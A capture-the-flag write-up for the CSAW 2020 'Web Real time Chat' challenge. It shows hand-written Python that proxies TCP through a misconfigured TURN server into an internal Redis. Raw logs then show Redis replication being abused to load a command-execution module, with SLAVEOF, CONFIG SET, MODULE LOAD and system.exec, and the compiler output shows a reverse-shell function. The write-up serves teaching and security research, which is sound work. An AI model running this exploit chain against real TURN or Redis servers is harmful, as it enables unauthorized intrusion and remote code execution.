# Web Real time Chat

```
I started playing around with some fancy new Web 3.1 technologies! This RTC tech looks cool, but there's a lot of setup to get it working... I hope it's all secure.

http://web.chal.csaw.io:4955
```

Accompanying the description are 3 files, a `Dockerfile`, the main server `app.py`, and a `supervisord.conf`.

## Enumeration

Looking at the `Dockerfile` and `supervisord.conf`, there are three servers running.  A redis server, which can't be reached externally, a flask
web server running through gunicorn, and coturn.

### Web Server

The web server servers a single page with some javascript.  It sets up webRTC(use Firefox) and uses it to send chat messages back and
forth with a peer.  If you access the page without a session id in the location hash, it will create one and give you a link to
open up a connection on another page.  Opening that link you're able to send messages between the new page and the one that created
the session.

#### rtc.js

Looking at the code in `rtc.js` we see the url and port for the turn server, and that the username and credentials are empty.

```js
const iceConfiguration = {
    iceServers: [
        {
            urls: 'turn:web.chal.csaw.io:3478',
            username: '',
            credential: ''
        }
    ]
    // Doesn't work to force relay only transport, something must be busted...
    //iceTransportPolicy: "relay"
}
```

#### app.py

This exposes the API and serves up the main page.  It allows for creating and joining sessions, as well as some logging.  Looking through
the code shows that the redis server seems to have a default configuration.  There don't seem to be any obvious flaws in it, so lets move
on to the TURN server.

### Coturn

TURN is Traversal Using Relay NAT.  The repo at https://github.com/coturn/coturn states it's a "Free open source implementation of TURN and STUN Server."  It basically serves as a middle-man/relay for the two peers that are both behind NATs.  The description tells us it serves
as a more general-purpose network traffic TURN server and gateway as well.

The description also contains a list of TURN and STUN RFCs, which will come in handy.  The relevant ones being 5766, 5389, and 6062.

Doing some more research we realize that TURN servers can be used to proxy to the internal network if not properly configured.

https://hackerone.com/reports/333419

## TURN TCP Proxying

We now have a potential way to access the redis server.  Reading the hackerone report we find the following

```
To successfully proxy a TCP message to the internal network, the following steps were done (the target was slack-calls-orca-bru-kwd4.slack-core.com):

1. Send an allocate request message
2. Receive an Unauthorized response with NONCE and REALM
3. Send an allocate request with a valid MESSAGE-INTEGRITY by using NONE, REALM, USERNAME and PASSWORD
4. Receive an allocate success response
5. Send a Connect request with `XOR-PEER-ADDRESS` set to an internal IP and port
6. Receive a Connect successful response
7. Create a new data socket and send a ConnectionBind request
8. Receive a ConnectionBind successful response
9. Send and receive data proxied to internal destination
```

It seems they used a tool called `stunner` but further research shows the tool isn't publicly available.  After some searching, we didn't find much that allowed us to do what we wanted so decided we'd just code our own tool.  It was pretty long and tedious, but ended up working.  The process, from a high level, is detailed here https://tools.ietf.org/html/rfc6062#page-6.

### Going out of TURN

There was a lot of reading RFCs to construct the packets, and then using wireshark to investigate the packets being sent and received. STUN 
requests basically consist of a header that includes a message type, length, a magic cookie value, and a transaction id; as well as a series of attributes composed of a type, length, and value.  Capturing a few packets from the site itself, sent by the browsers helped in deciphering the structure.

#### Allocation Request

According to the RFC and hackerone write-up, the first of three requests we need to send is an allocation request.  The following code should build it.

```python
CONNECTBIND_REQUEST = b'\x00\x0b'
CONNECT_REQUEST = b'\x00\x0a'
ALLOCATE_REQUEST = b'\x00\x03'
REQUESTED_TRANSPORT = b'\x00\x19'
TCP=b'\x06'
UDP=b'\x11' #17
COOKIE=b'\x21\x12\xA4\x42'
LIFETIME=b'\x00\x0D'
XOR_RELAYED_ADDRESS=b'\x00\x16'
XOR_MAPPED_ADDRESS=b'\x00\x20'
XOR_PEER_ADDRESS=b'\x00\x12'
SOFTWARE=b'\x80\x22'
CONNECTION_ID=b'\x00\x2a'

def gen_tran_id():
    return binascii.unhexlify(''.join(random.choice('0123456789ABCDEF') for i in range(24)))

def build_allocate_request():

  attributes = REQUESTED_TRANSPORT 
  attributes += b'\x00\x04' #length
  attributes += TCP
  attributes += b'\x00\x00\x00' #reserved?

  attributes += LIFETIME
  attributes += b'\x00\x04' # length
  attributes += b'\x00\x00\x0e\x10' # 3600

  attr_len = len(attributes)
  attr_len = attr_len.to_bytes(2, 'big')

  header = ALLOCATE_REQUEST
  header += attr_len
  header += COOKIE
  txnId = gen_tran_id()
  header += txnId
  print('generated txn id', binascii.hexlify(txnId))

  return header + attributes
```

Then we need some code to send and receive the request, as well as parse the response.  Wireshark and the RFCs coming in handy again while 
trying to troubleshoot.  The attributes have a pattern of type, length, and then value.  The allocation request basically requests a TCP
connection, and specifies how long it should live for.

```python
HOST = '216.165.2.41'
PORT = 3478

def parse_response(data):
  print('Message Type', data[0:2])

  msg_len = int.from_bytes(data[2:4], "big")
  print('Length', msg_len)

  cookie = data[4:8]
  print('Cookie', binascii.hexlify(cookie))

  txn_id = data[8:20]
  print('txn ID', binascii.hexlify(txn_id))

  attributes = data[20:20+msg_len]
  idx = 0
  while(idx < len(attributes)):
    # extract next attribute type, length and value
    attr_type = attributes[idx:idx+2]
    idx += 2
    attr_len = int.from_bytes(attributes[idx:idx+2], "big")
    idx += 2
    value = attributes[idx:idx+attr_len]
    idx += attr_len

    # switch on the attribute type, then parse and print the value
    if (attr_type == XOR_MAPPED_ADDRESS):
      print('attibute type XOR-MAPPED-ADDRESS')
      port = value[2:4]
      port0 = (port[0] ^ COOKIE[0]).to_bytes(1, byteorder='big')
      port0 += (port[1] ^ COOKIE[1]).to_bytes(1, byteorder='big')
      print('port', int.from_bytes(port0, "big"))
      ip = xor_addr_to_ip(value[4:])
      print('ip', ip)
      print('value', binascii.hexlify(value))

    elif (attr_type == XOR_RELAYED_ADDRESS):
      print('attribute type XOR-RELAYED-ADDRESS')
      port = value[2:4]
      port0 = (port[0] ^ COOKIE[0]).to_bytes(1, byteorder='big')
      port0 += (port[1] ^ COOKIE[1]).to_bytes(1, byteorder='big')
      print('port', int.from_bytes(port0, "big"))
      ip = xor_addr_to_ip(value[4:])
      print('ip', ip)
      print('value', binascii.hexlify(value))

    elif (attr_type == LIFETIME):
      print('attribute type LIFETIME')
      print('value', int.from_bytes(value, "big"))


    elif (attr_type == SOFTWARE):
      print('attribute type SOFTWARE')
      print('value', value.decode('ascii'))

    elif (attr_type == CONNECTION_ID):
      print('attribute type CONNECTION_ID')
      print('value', value)
      return value

    else:
      print('attribute type', binascii.hexlify(attr_type))
      print('length', attr_len)
      print('value', binascii.hexlify(value))

# Allocation Request
cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cs.connect((HOST, PORT))
cs.sendall(build_allocate_request())
data = cs.recv(1024)

print('Raw Allocation Request Response', data)
parse_response(data)
print('\n\n')
```

The trickiest part to parse are the address/port combinations, which have to be XORed against the magic cookie value.  When we succesfully build
and send the first request we get the following response:

```
generated txn id b'3ae8eebb809904c65ff84025'
Raw Allocation Request Response b'\x01\x03\x00(!\x12\xa4B:\xe8\xee\xbb\x80\x99\x04\xc6_\xf8@%\x00\x16\x00\x08\x00\x01\x9e\xd0\x8d\x03\xa4A\x00 \x00\x08\x00\x01z\xec\xa9\n\xf3$\x00\r\x00\x04\x00\x00\x0e\x10\x80"\x00\x04None'
Message Type b'\x01\x03'
Length 40
Cookie b'2112a442'
txn ID b'3ae8eebb809904c65ff84025'
attribute type XOR-RELAYED-ADDRESS
port 49090
ip 172.17.0.3
value b'00019ed08d03a441'
attibute type XOR-MAPPED-ADDRESS
port 23550
ip 136.24.87.102
value b'00017aeca90af324'
attribute type LIFETIME
value 3600
attribute type SOFTWARE
value None
```

Great, our allocation response has worked, and it has two addresses it mentions.  The `XOR-RELAYED-ADDRESS` of `172.17.0.3` seems to indicate
that it's the docker container address, and the other ip is our WAN ip.

#### Connect Request (First Attempt)

The next request in the setup is a connect request.  Here we specify the `XOR-PEER-ADDRESS` as localhost, and the default redis port of 6379,
to see if we can proxy to it.  We can build the STUN request with the following:

```python
def build_connect_request():

  attributes = XOR_PEER_ADDRESS
  attributes += b'\x00\x08' #length
  attributes += b'\x00\x01' #ipv4 = 0x01
  attributes += b'\x39\xf9' # 6379 -> 0x18eb ^ 0x2112 -> 0x39f9
  attributes += b'\x5e\x12\xa4\x43' # 127.0.0.1 -> 0x7F000001 ^ 0x2112A442 -> 0x5e12a443
  attr_len = len(attributes)
  attr_len = attr_len.to_bytes(2, 'big')

  header = CONNECT_REQUEST
  header += attr_len
  header += COOKIE
  txnId = gen_tran_id()
  header += txnId
  print('generated txn id', binascii.hexlify(txnId))

  return header + attributes
```

We then need to send the request and process the response:

```python
# Connect Request
cs.sendall(build_connect_request())
data = cs.recv(1024)

print('Raw Connect Request Response', data)
connection_id = parse_response(data)
print('\n\n')
```

If done properly, we should get a success response with a connection id that we need for the following request.  Lets see what happens.

```
generated txn id b'27706f2772e2fc069fb41a04'
Raw Connect Request Response b'\x01\x1a\x00\x1c!\x12\xa4B\'po\'r\xe2\xfc\x06\x9f\xb4\x1a\x04\x00\t\x00\x10\x00\x00\x04\x03Forbidden IP\x80"\x00\x04None'
Message Type b'\x01\x1a'
Length 28
Cookie b'2112a442'
txn ID b'27706f2772e2fc069fb41a04'
attribute type b'0009'
length 16
value b'00000403466f7262696464656e204950'
attribute type SOFTWARE
value None

Traceback (most recent call last):
  File "./redis-proxy.py", line 229, in <module>
    ds.sendall(build_connectbind_request(connection_id))
  File "./redis-proxy.py", line 134, in build_connectbind_request
    attributes += connection_id
TypeError: can't concat NoneType to bytes
```

Uh-oh, looking at the raw request output, and checking the packet in wireshark, we see that the IP address is forbidden, and we didn't get our
connection id that we needed.  Looks like we'll need to try something else.

#### Connect Request (Second Attempt)

So we know the docker subnet from the relay address in the allocation request.  Perhaps we can use that ip instead in order to access the
redis server.  Lets modify our build function and give it a go

```python
def build_connect_request():

  attributes = XOR_PEER_ADDRESS
  attributes += b'\x00\x08' #length
  attributes += b'\x00\x01' #ipv4 = 0x01
  attributes += b'\x39\xf9' # 6379 -> 0x18eb ^ 0x2112 -> 0x39f9
  attributes += b'\x8d\x03\xa4\x41' # 172.17.0.3 -> 0xAC110003 ^ 0x2112A442 -> 0x8d03a441
  attr_len = len(attributes)
  attr_len = attr_len.to_bytes(2, 'big')

  header = CONNECT_REQUEST
  header += attr_len
  header += COOKIE
  txnId = gen_tran_id()
  header += txnId
  print('generated txn id', binascii.hexlify(txnId))

  return header + attributes
```

And when we make our connect request attempt, we get in response

```python
generated txn id b'c1535cf939a61b388496cbe0'
Raw Connect Request Response b'\x01\n\x00\x08!\x12\xa4B\xc1S\\\xf99\xa6\x1b8\x84\x96\xcb\xe0\x00*\x00\x04\x87?\xd5\x11'
Message Type b'\x01\n'
Length 8
Cookie b'2112a442'
txn ID b'c1535cf939a61b388496cbe0'
attribute type CONNECTION_ID
value b'\x87?\xd5\x11'
```

Success!  We got our connection id.

#### ConnectionBind Request

The next request is the connection bind request.  The previous two requests occurred on the same socket, the control socket.  The connection 
bind request has to be sent on a new socket, and after the request, the socket becomes the proxy connection to redis.  Lets check the RFCs
and write some code to build our connection bind request.

```python
def build_connectbind_request(connection_id):

  attributes = CONNECTION_ID
  attributes += b'\x00\x04' #length
  attributes += connection_id
  attr_len = len(attributes)
  attr_len = attr_len.to_bytes(2, 'big')

  header = CONNECTBIND_REQUEST
  header += attr_len
  header += COOKIE
  txnId = gen_tran_id()
  header += txnId
  print('generated txn id', binascii.hexlify(txnId))

  return header + attributes
```

If this works, the new socket should behave as if it were directly connected to redis.  Lets setup some code to connect stdin/stdout to
the socket, then we can freely try commands.

```python
# ConnectionBind Request
ds = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ds.connect((HOST, PORT))
ds.sendall(build_connectbind_request(connection_id))
data = ds.recv(1024)

print('Raw ConnectionBind Request Response', data)
parse_response(data)
print('\n')

while 1:
  socket_list = [sys.stdin, ds]
  
  # Get the list sockets which are readable
  read_sockets, write_sockets, error_sockets = select.select(socket_list , [], [])
  
  for sock in read_sockets:
    #incoming message from remote server
    if sock == ds:
      data = sock.recv(4096)
      if not data :
        print('Connection closed')
        sys.exit()
      else :
        #print data
        sys.stdout.write(data.decode('ascii'))
    
    #user entered a message
    else :
      msg = sys.stdin.readline()
      ds.send(msg.encode('ascii'))
```

Lets run it and see how things go.

```
generated txn id b'94f5b75dd0ef28dde4622cf8'
Raw ConnectionBind Request Response b'\x01\x0b\x00\x08!\x12\xa4B\x94\xf5\xb7]\xd0\xef(\xdd\xe4b,\xf8\x80"\x00\x04None'
Message Type b'\x01\x0b'
Length 8
Cookie b'2112a442'
txn ID b'94f5b75dd0ef28dde4622cf8'
attribute type SOFTWARE
value None

KEYS *
*0
```

We type `KEYS *` and get a response, success! We now have a connection that behaves as if we have used telnet to connect a redis server.  
Eventually the connection gets reset, and this may either be due to a restart mechanism on the server, or a lack of refresh requests on
the control socket.  Either way, it stays open long enough we can pretty much get done whatever we need to.  One thing of note, when closing
the control socket, it seemed the data socket connection also was reset.

## Redis

Now we move on to attacking redis.  After attempting or ruling out most of the options outlined at https://book.hacktricks.xyz/pentesting/6379-pentesting-redis,
 we ended up searching for other options.  That's when we came across the following post https://medium.com/@knownsec404team/rce-exploits-of-redis-based-on-master-slave-replication-ef7a664ce1d0.  This article outlines a pretty cool technique that utilizes components of previous techniques and some clever syncing between a
master and a replica to load a custom module.  There are a few ingredients...

First is that redis servers can be either replicas or masters.  The replicas act as read-only backups, and the masters are responsible for 
writing.  So we can make the vulnerable redis server a replica of our own.  This means data from our own server will be 
synchronized to the replica.

Next is that redis allows for modules.  These are binaries that expose functionality via adding new commands to redis.  If we can
can call `LOAD MODULE /path/to/exploit.so` with a malicious module, we can do whatever we like.  We only need to get the module
file to somewhere accessible on the replica server.

Thirdly, it's possible to change the dbfilename and directory in the redis configuration at run time via `CONFIG SET dbfilename /path/to/exploit.so`, and `CONFIG SET DIR /tmp`. Then, when redis saves the current data to file, we can get arbitrary writes to file.  This can be 
initiated by a `PSYNC` command, and then transferring the payload to the replica.

Putting it together, we slave the target to our own server, configure the database filename and directory, replicate the payload as data via 
sync, and then our payload ends up as a file on the target system.  After that we load the module and use our new commands.

Thankfully there is existing code for this: https://github.com/LoRexxar/redis-rogue-server.  This script acts as a rogue redis
server and does most of the hard work for us.  We only need to provide it the connection to the target server and a payload.  The readme
for this repo mentions a redis module(https://github.com/n0b0dyCN/RedisModules-ExecuteCommand) that adds a `system.exec` command.  It looks like we have all the ingredients, lets start putting it together.

### The Payload

All we really need to do here is clone the repo and run make, and although the compilation throws a few warnings, we have our payload, `module.so`.  We'll also need to copy it into the same directory as the rogue server, renaming it `exp.so`, or modify the rogue server accordingly.

```sh
╭─zoey@virtual-parrot ~/sec/csaw/webrtc ‹master*› 
╰─$ git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git
Cloning into 'RedisModules-ExecuteCommand'...
remote: Enumerating objects: 494, done.
remote: Total 494 (delta 0), reused 0 (delta 0), pack-reused 494
Receiving objects: 100% (494/494), 207.79 KiB | 2.70 MiB/s, done.
Resolving deltas: 100% (284/284), done.
╭─zoey@virtual-parrot ~/sec/csaw/webrtc ‹master*› 
╰─$ cd RedisModules-ExecuteCommand 
╭─zoey@virtual-parrot ~/sec/csaw/webrtc/RedisModules-ExecuteCommand ‹master› 
╰─$ make
make -C ./src
make[1]: Entering directory '/home/zoey/sec/csaw/webrtc/RedisModules-ExecuteCommand/src'
make -C ../rmutil
make[2]: Entering directory '/home/zoey/sec/csaw/webrtc/RedisModules-ExecuteCommand/rmutil'
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o util.o util.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o strings.o strings.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o sds.o sds.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o vector.o vector.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o alloc.o alloc.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o periodic.o periodic.c
ar rcs librmutil.a util.o strings.o sds.o vector.o alloc.o periodic.o
make[2]: Leaving directory '/home/zoey/sec/csaw/webrtc/RedisModules-ExecuteCommand/rmutil'
gcc -I../ -Wall -g -fPIC -lc -lm -std=gnu99     -c -o module.o module.c
module.c: In function ‘DoCommand’:
module.c:16:29: warning: initialization discards ‘const’ qualifier from pointer target type [-Wdiscarded-qualifiers]
   16 |                 char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);
      |                             ^~~~~~~~~~~~~~~~~~~~~~~~
module.c:23:29: warning: implicit declaration of function ‘strlen’ [-Wimplicit-function-declaration]
   23 |                         if (strlen(buf) + strlen(output) >= size) {
      |                             ^~~~~~
module.c:23:29: warning: incompatible implicit declaration of built-in function ‘strlen’
module.c:11:1: note: include ‘<string.h>’ or provide a declaration of ‘strlen’
   10 | #include <netinet/in.h>
  +++ |+#include <string.h>
   11 | 
module.c:27:25: warning: implicit declaration of function ‘strcat’ [-Wimplicit-function-declaration]
   27 |                         strcat(output, buf);
      |                         ^~~~~~
module.c:27:25: warning: incompatible implicit declaration of built-in function ‘strcat’
module.c:27:25: note: include ‘<string.h>’ or provide a declaration of ‘strcat’
module.c:29:80: warning: incompatible implicit declaration of built-in function ‘strlen’
   29 |                 RedisModuleString *ret = RedisModule_CreateString(ctx, output, strlen(output));
      |                                                                                ^~~~~~
module.c:29:80: note: include ‘<string.h>’ or provide a declaration of ‘strlen’
module.c: In function ‘RevShellCommand’:
module.c:41:14: warning: initialization discards ‘const’ qualifier from pointer target type [-Wdiscarded-qualifiers]
   41 |   char *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);
      |              ^~~~~~~~~~~~~~~~~~~~~~~~
module.c:42:18: warning: initialization discards ‘const’ qualifier from pointer target type [-Wdiscarded-qualifiers]
   42 |   char *port_s = RedisModule_StringPtrLen(argv[2], &cmd_len);
      |                  ^~~~~~~~~~~~~~~~~~~~~~~~
module.c:48:24: warning: implicit declaration of function ‘inet_addr’ [-Wimplicit-function-declaration]
   48 |   sa.sin_addr.s_addr = inet_addr(ip);
      |                        ^~~~~~~~~
module.c:57:3: warning: null argument where non-null required (argument 2) [-Wnonnull]
   57 |   execve("/bin/sh", 0, 0);
      |   ^~~~~~
ld -o module.so module.o -shared -Bsymbolic  -L../rmutil -lrmutil -lc 
make[1]: Leaving directory '/home/zoey/sec/csaw/webrtc/RedisModules-ExecuteCommand/src'
cp ./src/module.so .
╭─zoey@virtual-parrot ~/sec/csaw/webrtc/RedisModules-ExecuteCommand ‹master› 
╰─$ l
total 100K
drwxr-xr-x 1 zoey zoey  164 Sep 13 21:06 .
drwxr-xr-x 1 zoey zoey  418 Sep 13 21:06 ..
-rw-r--r-- 1 zoey zoey 1.9K Sep 13 21:06 .clang-format
drwxr-xr-x 1 zoey zoey  138 Sep 13 21:06 .git
-rw-r--r-- 1 zoey zoey   45 Sep 13 21:06 .gitignore
-rw-r--r-- 1 zoey zoey 1.1K Sep 13 21:06 LICENSE
-rw-r--r-- 1 zoey zoey  472 Sep 13 21:06 Makefile
-rwxr-xr-x 1 zoey zoey  47K Sep 13 21:06 module.so
-rw-r--r-- 1 zoey zoey  598 Sep 13 21:06 README.md
-rw-r--r-- 1 zoey zoey  29K Sep 13 21:06 redismodule.h
drwxr-xr-x 1 zoey zoey  588 Sep 13 21:06 rmutil
drwxr-xr-x 1 zoey zoey   66 Sep 13 21:06 src
```

### Rogue Server Modification

Next we'll need to modify the rogue server code to utilize the data socket we created in our previous script, since it's normally
setup to just directly connect to the target server.  To achieve this, we'll copy and paste in our code, and then modify the
initializer for the `Remote` server class in `redis-rogue-server.py`.  We'll also need to modify some of the `CONFIG SET` commands
that determine the payload location, as it's likely that `/app`, where the default database is, is not write-able.  You might
also have to make some tweaks to the handling of addresses and ports depending on if your attack machine is behind a NAT.

### Running the Exploit

Assuming everything has gone to plan, we should now be able to run the exploit.  Lets give it a try.

```python
╭─zoey@virtual-parrot ~/sec/csaw/webrtc/redis-rogue-server ‹master*› 
╰─$ ./redis-rogue-server.py --rhost redis-via-turn --rport 6379 --lhost 3.14.182.203 --lport 15240
TARGET redis-via-turn:6379
SERVER 3.14.182.203:15240
generated txn id b'254c37dcf8487fa530d69a26'
Raw Allocation Request Response b'\x01\x03\x00(!\x12\xa4B%L7\xdc\xf8H\x7f\xa50\xd6\x9a&\x00\x16\x00\x08\x00\x01\x9e\xb5\x8d\x03\xa4A\x00 \x00\x08\x00\x01\x8c\x08\xa9\n\xf3$\x00\r\x00\x04\x00\x00\x0e\x10\x80"\x00\x04None'
Message Type b'\x01\x03'
Length 40
Cookie b'2112a442'
txn ID b'254c37dcf8487fa530d69a26'
attribute type XOR-RELAYED-ADDRESS
port 49063
ip 172.17.0.3
value b'00019eb58d03a441'
attibute type XOR-MAPPED-ADDRESS
port 44314
ip 136.24.87.102
value b'00018c08a90af324'
attribute type LIFETIME
value 3600
attribute type SOFTWARE
value None

generated txn id b'72a9a2dc5278c017bf901310'
Raw Connect Request Response b'\x01\n\x00\x08!\x12\xa4Br\xa9\xa2\xdcRx\xc0\x17\xbf\x90\x13\x10\x00*\x00\x04C\xef\xd2\x0b'
Message Type b'\x01\n'
Length 8
Cookie b'2112a442'
txn ID b'72a9a2dc5278c017bf901310'
attribute type CONNECTION_ID
value b'C\xef\xd2\x0b'

generated txn id b'9aa38664daa8dae52547a56c'
Raw ConnectionBind Request Response b'\x01\x0b\x00\x08!\x12\xa4B\x9a\xa3\x86d\xda\xa8\xda\xe5%G\xa5l\x80"\x00\x04None'
Message Type b'\x01\x0b'
Length 8
Cookie b'2112a442'
txn ID b'9aa38664daa8dae52547a56c'
attribute type SOFTWARE
value None

[<-] b'*3\r\n$7\r\nSLAVEOF\r\n$12\r\n3.14.182.203\r\n$5\r\n15240\r\n'
[->] b'+OK\r\n'
[<-] b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\nDIR\r\n$4\r\n/tmp\r\n'
[->] b'+OK\r\n'
[<-] b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$6\r\nexp.so\r\n'
[->] b'+OK\r\n'
[->] b'PING\r\n'
[<-] b'+PONG\r\n'
[->] b'REPLCONF listening-port 6379\r\n'
[<-] b'+OK\r\n'
[->] b'REPLCONF capa eof capa psync2\r\n'
[<-] b'+OK\r\n'
[->] b'PSYNC 1a6db93c270f1d9052f04a3372f80755954ab0da 1\r\n'
[<-] b'+FULLRESYNC ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ 1\r\n$47856\r\n\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'......b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x19\xb4\x00\x00\x00\x00\x00\x00\xd3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\r\n'
[<-] b'*3\r\n$6\r\nMODULE\r\n$4\r\nLOAD\r\n$11\r\n/tmp/exp.so\r\n'
[->] b'+OK\r\n'
[<-] b'*3\r\n$7\r\nSLAVEOF\r\n$2\r\nNO\r\n$3\r\nONE\r\n'
[->] b'+OK\r\n'
[<<] system.exec "cat /flag.txt"
[<-] b'*2\r\n$11\r\nsystem.exec\r\n$27\r\nsystem.exec "cat /flag.txt"\r\n'
[->] b'$5\r\n0\n96\n\r\n'
[>>] 0
[>>] 96
[<<] system.exec "cat /flag.txt"
[<-] b'*2\r\n$11\r\nsystem.exec\r\n$27\r\nsystem.exec "cat /flag.txt"\r\n'
[->] b'$0\r\n\r\n'
```

Looking at the output, it looks as if pretty much everything went to plan, except for when we run our new `system.exec` command.  The
response is not quite what we expect.  Perhaps we need to make some additional changes to the rogue redis server code.  *Or*, we could just use
our previous script and proxy in a new interactive connection we know that works already.

```sh
╭─zoey@virtual-parrot ~/sec/csaw/webrtc ‹master*› 
╰─$ ./redis-proxy.py 
generated txn id b'49e40549d4c5a1d5b9fc9fb0'
Raw Allocation Request Response b'\x01\x03\x00

...

system.exec "cat /flag.txt"
$44
flag{ar3nt_u_STUNned_any_t3ch_w0rks_@_all?}
```

Success! When we hit CTRL+C to cancel the interactivity for the rogue server, it then sends its clean up commands, restoring the original
state.

```python
[<<] ^C[<-] b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$8\r\ndump.rdb\r\n'
[->] b'+OK\r\n'
[<-] b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$4\r\n/app\r\n'
[->] b'+OK\r\n'
[<-] b'*2\r\n$11\r\nsystem.exec\r\n$14\r\nrm /tmp/exp.so\r\n'
[->] b'$0\r\n\r\n'
[<-] b'*3\r\n$6\r\nMODULE\r\n$6\r\nUNLOAD\r\n$6\r\nsystem\r\n'
[->] b'+OK\r\n'
```

The full `redis-proxy.py` script is available at https://github.com/zoeyg/public-write-ups/blob/master/csaw-2020/redis-proxy.py, and the modified `redis-rogue-server.py` script is available at https://github.com/zoeyg/public-write-ups/blob/master/csaw-2020/redis-rogue-server.py.